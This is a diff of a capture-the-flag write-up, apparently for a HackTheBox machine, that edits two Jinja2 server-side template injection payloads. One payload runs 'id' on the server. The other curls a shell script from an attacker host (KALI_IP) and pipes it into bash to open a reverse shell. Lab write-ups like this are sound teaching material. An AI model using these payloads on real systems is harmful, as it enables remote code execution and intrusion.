@@ -94,7 +94,7 @@ I then went through [This](https://github.com/swisskyrepo/PayloadsAllTheThings/t
 
 ![Doctor](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/doctor/f17b668dc8504c7082c2eda6b6dc920b.png)
 
-Now that we have a valid SSTI vulnerability and have a general idea what engine it is running we can now try and get a reverse shell. In that same repo there is a section titled "Jinja2 - Remote Code Execution" with a test payload `{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}`. That will try and run the `id` command and return the results. I'll put that into the title field and open up `/archive` and see if it got executed.
+Now that we have a valid SSTI vulnerability and have a general idea what engine it is running we can now try and get a reverse shell. In that same repo there is a section titled "Jinja2 - Remote Code Execution" with a test payload `self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() `. That will try and run the `id` command and return the results. I'll put that into the title field and open up `/archive` and see if it got executed.
 
 ![Doctor](https://raw.githubusercontent.com/0xZon/0xZon.github.io/main/assets/img/doctor/61c32c239f0b455b9e68a2327b4c3b26.png)
 
@@ -128,7 +128,7 @@ python3 -m http.server 80
 Then I will edit the payload to curl bash our reverse shell
 
 ```
-{.\{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl KALI_IP/shell.sh |bash').read() }}
+ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('curl KALI_IP/shell.sh |bash').read() 
 ```
 
 Then once we go to `/archive` we will get our shell!
